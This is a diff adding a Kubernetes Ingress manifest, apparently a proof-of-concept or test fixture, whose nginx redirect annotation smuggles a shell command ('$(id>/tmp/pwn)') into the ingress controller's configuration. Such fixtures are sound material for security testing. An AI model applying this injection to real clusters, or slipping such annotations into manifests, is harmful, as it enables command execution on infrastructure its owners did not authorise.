@@ -1,0 +1,16 @@
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: evil-ing
+  annotations:
+    nginx.ingress.kubernetes.io/permanent-redirect: "http://example.com;$(id>/tmp/pwn)"
+spec:
+  rules:
+  - host: demo.local
+    http:
+      paths:
+      - path: /
+        pathType: Prefix
+        backend:
+          service: { name: kube-dns, port: { number: 53 } }
+
